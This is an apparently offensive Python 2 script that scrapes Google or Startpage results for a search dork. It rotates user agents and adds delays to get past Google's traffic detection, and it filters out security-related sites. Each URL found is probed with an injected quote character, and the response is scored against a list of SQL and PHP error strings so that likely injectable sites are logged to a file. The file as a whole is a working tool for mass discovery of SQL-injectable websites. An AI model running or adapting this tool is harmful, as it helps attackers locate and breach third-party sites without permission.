


import os
import sys
import requests
import time
from random import randint
from termcolor import colored


def     block_cutter (string, int_start, int_end):

        newd = ""

        while (int_start <= int_end):
            newd += string[int_start]
            int_start += 1
        return newd


def     dump_page(string):
        dump = []
        string = string.replace("range(", '')
        string = string.replace(')', '')
        dump = string.split(',')
    
        return dump



def     rand_agent ():

        rnd_n = randint(5, 4200)

        agent_file = open('agents.txt', 'r')
        user_agent = str(agent_file.readlines()[rnd_n])
        agent_file.close()
        user_agent = user_agent.replace('\n', '')
        return user_agent



def     ipuser ():

        ca = 0
        cb = 0
        ipreq = requests

        try:
            ipreq = requests.get('https://www.iplocation.net/find-ip-address')
            data = ipreq.text.encode('utf-8')

            if (data.find("color:green;'>") > -1):
                ca = data.find("color:green;'>")+len("color:green;'>")
            if (data.find("</span>.<br /><span") > -1):
                cb = data.find("</span>.<br /><span")-1
            ipuser_str = block_cutter (data, ca, cb)

        except requests.exceptions.ConnectionError:
            ipreq.status_code = "Connection refused"
            print colored(" [!] IP Public Error \n", 'red')
            ipuser_str = "NULL"
        
        return str(ipuser_str)




def     myParserGSE (greq, bp):

        i = 0 
        ca = 0
        cb = 0
        urls = []
        nurls = []

        if (greq.find("<b>About this page</b><br><br>Our systems have detected unusual traffic from your computer network.") > -1):
            print colored(" [!] Google Security Traffic page detected ! < Unusual Traffic >", 'red')
            print colored(" [*] Change your IP - wait 1/2 hours - Bypass this !", 'blue')
            exit()

        while (i < len(greq)-1):
                
            if (greq[i] == 'h'):
                ca = i
                while (i < len(greq)-1 and greq[i] != ':'):
                    i += 1
                cb = i
                tmp = block_cutter (greq, ca, cb)
            
                if (tmp == 'http:' or tmp == 'https:' or (tmp == "h3 class='clk'><a href='http:" and bp > 0) or (tmp == "h3 class='clk'><a href='https:" and bp > 0) or (tmp == "href='http:" and bp > 0) or (tmp == "href='https:" and bp > 0)):

                    while (i < len(greq)-1 and greq[i] != ' '):
                        i += 1
                    cb = i
                    if (bp > 0):
                        url_found = block_cutter (greq, (ca+len("h3 class='clk'><a href='")), cb-2)
                    else:
                        url_found = block_cutter (greq, ca, cb)
                    

                    if (url_found.find('%252B') > -1):
                        url_found = block_cutter (url_found, 0, url_found.find('%252B')-1)
                    if (url_found.find('</cite>') > -1):
                        url_found = block_cutter (url_found, 0, url_found.find('</cite>')-1)
                    if (url_found.find('&amp;') > -1):
                        url_found = block_cutter (url_found, 0, url_found.find('&amp;')-1)
                    if (url_found.find('+') > -1):
                        url_found = block_cutter (url_found, 0, url_found.find('+')-1)
                    if (url_found.find('&nbsp;') > -1):
                        url_found = block_cutter (url_found, 0, url_found.find('&nbsp;')-1)
                    if (url_found.find('...') > -1):
                        url_found = block_cutter (url_found, 0, url_found.find('...')-1)
                    if (url_found.find('&L=') > -1):
                        url_found = block_cutter(url_found, 0, url_found.find('&L=')-1)
                    if (url_found.find('#') > -1):
                        url_found = block_cutter(url_found, 0, url_found.find('#')-1)
                    if (url_found.find('.</') > -1):
                        url_found = block_cutter(url_found, 0, url_found.find('.</')-1)
                    if (url_found.find('.</span></div></div><div') > -1):
                        url_found = block_cutter(url_found, 0, url_found.find('.</span></div></div><div')-1)

                    #if (url_found.find('<b>') > -1):
                    url_found = url_found.replace('<b>', '')
                    #if (url_found.find('</b>') > -1):
                    url_found = url_found.replace('</b>', '')
                    #if (url_found.find('"') > -1):
                    url_found = url_found.replace('"', '')
                    #if (url_found.find('<br>') > -1):
                    url_found = url_found.replace('<br>', '')
                    #if (url_found.find('</br>') > -1):
                    url_found = url_found.replace('</br>', '')
                    
                    
                    #if (url_found.find('%253F') > -1):
                    url_found = url_found.replace('%253F', '')
                    #if (url_found.find('%3F') > -1):
                    url_found = url_found.replace('%3F', '?')
                    #if (url_found.find('%253D') > -1):
                    url_found = url_found.replace('%253D', '=')
                    #if (url_found.find('%2526') > -1):
                    url_found = url_found.replace('%2526', '&')
                    #if (url_found.find('%3D') > -1):
                    url_found = url_found.replace('%3D', '=')
                    #if (url_found.find('%26') > -1):
                    url_found = url_found.replace('%26', '&')


                    if (url_found.find('.google.') == -1 and url_found.find('.gstatic.') == -1 and url_found.find('injection-sql') == -1 and url_found.find('sql-injection') == -1 and url_found.find('sql-injections') == -1 and url_found.find('sql-dorks') == -1 and url_found.find('dorks') == -1 and url_found.find('hack') == -1 and url_found.find('scribd') == -1 and url_found.find('pastebin') == -1 and url_found.find('stackoverflow') == -1 and url_found.find('over-blog') == -1 and url_found.find('github') == -1 and url_found.find('blogspot') == -1 and url_found.find('facebook') == -1 and url_found.find('moodle.') == -1 and url_found.find('openclassroom') == -1 and url_found.find('cracking.org') == -1 and url_found.find('websec.ca') == -1 and url_found.find('sql_injection') == -1 and url_found.find('injection_sql') == -1 and url_found.find('carding_dork') == -1 and url_found.find('carding-dork') == -1 and url_found.find('hacking') == -1 and url_found.find('vulnerability-lab.com') == -1):
                        if ((url_found.find('http:') > -1 or url_found.find('https:') > -1) and url_found.find('=') > -1 and url_found.find('?') > -1 and url_found.find('ixquick-proxy.com') == -1):
                            urls.append(url_found)
                            print (" [!] URL Found: "+url_found)
                    #else:
                        #print (" [*] URL Ignored: "+url_found)
                    
            i += 1

        nurls = list(set(urls))
        return nurls
        

def     myParserSQLE (url):
        
        lvl = 0
        user_agent = rand_agent()
        headers = {'User-Agent': user_agent}
        wb_req = type(requests)

        try:
            wb_req = requests.get(url, headers=headers)
            data = wb_req.text.encode('utf-8')
            #SFind
            if (data.find('MySQL') > -1):
                lvl += 1
            if (data.find('SQL') > -1):
                lvl += 1
            if (data.find('SQL syntax') > -1):
                lvl += 2
            if (data.find('Warning:') > -1):
                lvl += 3
            if (data.find('Invalid argument supplied for') > -1):
                lvl += 1
            if (data.find('Notice: Undefined variable: ') > -1):
                lvl += 2
            if (data.find('supplied argument is not a valid MySQL result resource in') > -1):
                lvl += 4
            if (data.find('valid MySQL result') > -1):
                lvl += 5
            if (data.find('Incorrect syntax near') > -1):
                lvl += 4
            if (data.find('You have an error in your SQL syntax') > -1):
                lvl += 4
            if (data.find('mysql_num_rows(): ') > -1):
                lvl += 5
            if (data.find('mysql_num_row():') > -1):
                lvl += 5
            if (data.find('mysql_fetch_array(): ') > -1):
                lvl += 4
            if (data.find('mysql_query(): ') > -1):
                lvl += 4
            if (data.find('Warning: mysql_result(): ') > -1):
                lvl += 4
            if (data.find('Warning: Unknown(): ') > -1):
                lvl += 3
            if (data.find('Warning: array_merge(): ') > -1):
                lvl += 3
            if (data.find('Warning: require(): ') > -1):
                lvl += 3
            if (data.find('MySQL Error: ') > -1):
                lvl += 3
            if (data.find('SQL Error: ') > -1):
                lvl += 3
            if (data.find('Unable to jump to row') > -1):
                lvl += 1
            if (data.find('Session halted.') > -1):
                lvl += 3
            if (data.find('Access denied for') > -1):
                lvl += 3
            if (data.find('ODBC SQL Server Driver') > -1):
                lvl == 1
            if (data.find('argument should be an array in') > -1):
                lvl += 4
            if (data.find(' expects parameter 1 to be resource, boolean given in ') > -1):
                lvl += 3
            if (data.find('Warning: array_key_exists()') > -1):
                lvl += 2
            if (data.find('Warning: parse_ini_file') > -1):
                lvl += 2
            if (data.find('SAFE MODE Restriction in effect.') > -1):
                lvl += 1


            if (lvl > 0 and lvl < 4):
                print colored(" [!] Vulnerable LVL: "+str(lvl)+" - Very Low", 'green')
                return lvl
            elif (lvl > 3 and lvl < 6):
                print colored(" [!] Vulnerable LVL: "+str(lvl)+" - Low", 'green')
                return lvl
            elif (lvl > 5 and lvl < 9):
                print colored(" [!] Vulnerable LVL: "+str(lvl)+" - Medium", 'green')
                return lvl
            elif (lvl > 8 and lvl < 15):
                print colored(" [!] Vulnerable LVL: "+str(lvl)+" - Hight *Critical", 'green')
                return lvl
            elif (lvl > 14):
                print colored(" [!] Vulnerable LVL: "+str(lvl)+" - Legendary *Critical+", 'green')
                return lvl
            else :
                print colored(" [-] Grrr ...", 'red')
                return lvl
        except requests.exceptions.ConnectionError:
            #wb_req.status_code = "Connection refused"
            print colored(" [-] Request Error, ignored ... ", 'cyan')
            ##b_req.status_code = "Connection refused"
        except requests.exceptions.TooManyRedirects:
            #wb_req.status_code = "Connection refused"
            print colored(" [-] Request Error, ignored ... ", 'cyan')
            #wb_req.status_code = "Connection refused"
    


def     marvin_ppa (url, out_file):
        
        print colored("\n [Marvin Ppa] work on "+url, 'blue')
        
        qurl = url+"%%2727"
        if (url.find('search.php?search_id=') > -1):
            qurl = block_cutter(url, 0, (url.find('search.php?search_id=')+len("search.php?search_id=")-1))
            qurl += "1%%2727"
    
        if (myParserSQLE (qurl) > 0):
            dump = open(out_file, 'a')
            dump.write(url+"\n")
            dump.close()
            return 1
        else:
            return 0


def     moulinette (urls, out_file):

        i = 0
        n = 0
        stress = 0
        while (i < len(urls)):
            stress = marvin_ppa (urls[i], out_file)
            if (stress == 1):
                n += 1
            i += 1
        return n



def     search_engine (dork, n_page, out_file, bp, cdom):

        IP_PO = ipuser()
        print colored(" [*] Public IP overview: "+IP_PO, 'blue')

        su_filter = ""
        urls_found = []
        pvalue = 0
        i = 0
        ca = 0
        cb = 0

        if (len(dump_page(n_page)) > 1):
            pvalue = str(dump_page(n_page)[0])
            pvalue = pvalue.replace("'", '')
            pvalue = pvalue.replace('[', '')
            pvalue = pvalue.replace(']', '')
            i = int(pvalue)
            if (i <= 0):
                i = 1

            pvalue = str(dump_page(n_page)[1])
            pvalue = pvalue.replace("'", '')
            pvalue = pvalue.replace('[', '')
            pvalue = pvalue.replace(']', '')
            n_page = int(pvalue)

        else:
            pvalue = str(dump_page(n_page))
            pvalue = pvalue.replace("'", '')
            pvalue = pvalue.replace('[', '')
            pvalue = pvalue.replace(']', '')
            i = 0
            n_page = int(pvalue)
        
        if (len(cdom) > 0):
            if (cdom[0] == '.'):       
                cdom = block_cutter(cdom, 1, len(cdom)-1)

        print colored(" [*] GSE Crawling wait ...\n", 'cyan')

        if (bp > 0):
            user_agent = rand_agent()
            headers = {'User-Agent': user_agent}
            print colored("\n\n [+] User-Agent: "+user_agent, 'green')
            nurl = "https://s10-eu4.startpage.com/do/search?cmd=process_search&language=english&prf=21334709fc6a498bfad2ed75d1597501&suggestOn=1&rcount=&rl=NONE&abp=1&t=night&query="+dork+"&cat=web&engine0=v1all&startat=0&nj=0"
            print colored(" [*] Search SPGKey ...", 'cyan')
            r = requests.get(nurl)
            data = r.text.encode('utf-8')

            if (data.find("qid=") > -1):
                ca = (data.find("qid="))
                cb = ca
                while (cb < (len(data)-1) and data[cb] != '&'):
                    cb += 1
                SPGKey = block_cutter(data, ca+4, cb-1)
                print colored(" [!] SPGKey: "+SPGKey, 'green')
                
            else:
                print colored(" [*] ERROR SPGKey !", 'red')
                exit(0)

        while (i <= n_page-1):

            g_page = str(i*10)

            user_agent = rand_agent()
            headers = {'User-Agent': user_agent}

            print colored("\n\n [+] User-Agent: "+user_agent, 'green')

            if (bp > 0):
                
                time.sleep(randint(1, 3))
                nurl = "https://s10-eu4.startpage.com/do/search?cmd=process_search&language=english&prf=21334709fc6a498bfad2ed75d1597501&suggestOn=1&qid="+SPGKey+"&rcount=&rl=NONE&abp=1&t=night&query="+dork+"&cat=web&engine0=v1all&startat="+g_page+"&nj=0"
            
            else:
                time.sleep(randint(1, 3))
                if (cdom != ''):
                    print colored(" [+] Domain: "+cdom, 'green')
                    nurl = "https://www.google."+cdom+"/search?q="+dork+"&start="+g_page+"&num=10&filter=0"
                else:
                    nurl = "https://www.google.com/search?q="+dork+"&start="+g_page+"&num=10&filter=0"
            
            greq = requests.get(nurl, headers=headers)
            gdata = greq.text.encode('utf-8')
            
            urls_found += myParserGSE (gdata, bp)
    
            i += 1

        
        urls_found = list(set(urls_found))
    
        print colored("\n [*] GSE Crawling finished, Marvin Ppa > \n", 'cyan')
        nbr = moulinette (urls_found, out_file)
        print colored("\n [!] URLs Saved: "+str(nbr)+" in '"+out_file+"' !", 'green')
        print colored(" [*] Verify if is not fake positive ! ... \n\n", 'red')








        
